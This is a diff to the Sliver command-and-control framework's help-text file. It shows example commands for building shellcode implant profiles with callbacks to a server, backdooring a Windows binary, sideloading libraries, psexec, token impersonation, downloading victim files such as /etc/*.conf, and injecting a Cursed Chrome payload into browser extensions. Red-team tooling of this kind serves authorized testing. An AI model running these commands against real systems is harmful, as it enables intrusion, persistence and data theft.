@@ -103,6 +103,11 @@ var (
 		consts.ReactionStr:                         reactionHelp,
 		consts.ReactionStr + sep + consts.SetStr:   reactionSetHelp,
 		consts.ReactionStr + sep + consts.UnsetStr: reactionUnsetHelp,
+
+		consts.Cursed + sep + consts.CursedChrome: cursedChromeHelp,
+
+		// Builders
+		consts.BuildersStr: buildersHelp,
 	}
 
 	jobsHelp = `[[.Bold]]Command:[[.Normal]] jobs <options>
@@ -204,10 +209,10 @@ stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile
 
 To create a profile, use the [[.Bold]]profiles new[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:
 
-profiles new --profile-name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
+profiles new --format shellcode --mtls 1.2.3.4 --skip-symbols windows-shellcode
 `
 
-	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new [--profile-name] <options>
+	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new <options> <profile name>
 [[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.
 
 [[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
@@ -279,7 +284,26 @@ On Windows, escaping is disabled. Instead, '\\' is treated as path separator.
 [[.Bold]]About:[[.Normal]] Cat a remote file to stdout.`
 
 	downloadHelp = `[[.Bold]]Command:[[.Normal]] download [remote src] <local dst>
-[[.Bold]]About:[[.Normal]] Download a file from the remote system.`
+[[.Bold]]About:[[.Normal]] Download a file or directory from the remote system. Directories will be downloaded as a gzipped TAR file.
+[[.Bold]][[.Underline]]Filters[[.Normal]]
+Filters are a way to limit downloads to file names matching given criteria. Filters DO NOT apply to directory names.
+
+Filters are specified after the path.  A blank path will filter on names in the current directory.  For example:
+download /etc/*.conf will download all files from /etc whose names end in .conf. /etc/ is the path, *.conf is the filter.
+
+Downloads can be filtered using the following patterns:
+'*': Wildcard, matches any sequence of non-path separators (slashes)
+	Example: n*.txt will match all file names starting with n and ending with .txt
+
+'?': Single character wildcard, matches a single non-path separator (slashes)
+	Example: s?iver will match all file names starting with s followed by any non-separator character and ending with iver.
+
+'[{range}]': Match a range of characters.  Ranges are specified with '-'. This is usually combined with other patterns. Ranges can be negated with '^'.
+	Example: [a-c] will match the characters a, b, and c.  [a-c]* will match all file names that start with a, b, or c.
+		^[r-u] will match all characters except r, s, t, and u.
+
+If you need to match a special character (*, ?, '-', '[', ']', '\\'), place '\\' in front of it (example: \\?).
+On Windows, escaping is disabled. Instead, '\\' is treated as path separator.`
 
 	uploadHelp = `[[.Bold]]Command:[[.Normal]] upload [local src] <remote dst>
 [[.Bold]]About:[[.Normal]] Upload a file to the remote system.`
@@ -346,8 +370,8 @@ Sideload a MacOS shared library into a new process using DYLD_INSERT_LIBRARIES:
 	sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment -a 'Hello World' /tmp/mylib.dylib
 Sideload a Linux shared library into a new bash process using LD_PRELOAD:
 	sideload -p /bin/bash /tmp/mylib.so
-Sideload a Windows DLL as shellcode in a new process using sRDI, specifying the entrypoint and its arguments:
-	sideload -a "hello world" -e MyEntryPoint /tmp/mylib.dll
+Sideload a Windows DLL as shellcode in a new process using Donut, specifying the entrypoint and its arguments:
+	sideload -e MyEntryPoint /tmp/mylib.dll "argument to the function MyEntryPoint"
 
 [[.Bold]]Remarks:[[.Normal]]
 Linux and MacOS shared library must call exit() once done with their jobs, as the Sliver implant will wait until the hosting process
@@ -431,7 +455,7 @@ The profile must be created with the [[.Bold]]service[[.Normal]] format, so that
 
 To create such a profile, use the [[.Bold]]profiles new[[.Normal]] command:
 
-profiles new --format service --skip-symbols --mtls a.bc.de --profile-name win-svc64
+profiles new --format service --skip-symbols --mtls a.bc.de win-svc64
 
 Once the profile has been created, run the [[.Bold]]psexec[[.Normal]] command:
 
@@ -443,10 +467,20 @@ The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows u
 [[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
 [[.Bold]]Example:[[.Normal]] backdoor --profile windows-shellcode "c:\windows\system32\calc.exe"
 
-[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: profiles new --format shellcode --profile-name whatever --http ab.cd
+[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: profiles new --format shellcode --http ab.cd windows-shellcode
 `
 	makeTokenHelp = `[[.Bold]]Command:[[.Normal]] make-token -u USERNAME -d DOMAIN -p PASSWORD
 [[.Bold]]About:[[.Normal]] Creates a new Logon Session from the specified credentials and impersonate the resulting token.
+You can specify a custon Logon Type using the [[.Bold]]--logon-type[[.Normal]] flag, which defaults to [[.Bold]]LOGON32_LOGON_NEW_CREDENTIALS[[.Normal]].
+Valid types are:
+
+LOGON_INTERACTIVE
+LOGON_NETWORK
+LOGON_BATCH
+LOGON_SERVICE
+LOGON_UNLOCK
+LOGON_NETWORK_CLEARTEXT
+LOGON_NEW_CREDENTIALS
 `
 
 	getEnvHelp = `[[.Bold]]Command:[[.Normal]] getenv [name]
@@ -667,6 +701,26 @@ dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --reference-file /t
 
 	getPrivsHelp = `[[.Bold]]Command:[[.Normal]] getprivs
 [[.Bold]]About:[[.Normal]] Get privilege information for the current process (Windows only).
+`
+
+	cursedChromeHelp = `[[.Bold]]Command:[[.Normal]] cursed chrome
+[[.Bold]]About:[[.Normal]] Injects a Cursed Chrome payload into an existing Chrome extension.
+
+If no extension is specified, Sliver will enumerate all installed extensions, extract their
+permissions and determine a valid target for injection. For Cursed Chrome to work properly
+the target extension must have either of these two sets of permissions:
+
+1. "webRequest" "webRequestBlocking" "<all_urls>" 
+2. "webRequest" "webRequestBlocking" "http://*/*" "https://*/*" 
+
+More information: https://github.com/mandatoryprogrammer/CursedChrome
+`
+
+	buildersHelp = `[[.Bold]]Command:[[.Normal]] builders
+[[.Bold]]About:[[.Normal]] Lists external builders currently registered with the server.
+
+External builders allow the Sliver server offload implant builds onto external machines.
+For more information: https://github.com/BishopFox/sliver/wiki/External-Builders
 `
 )
 
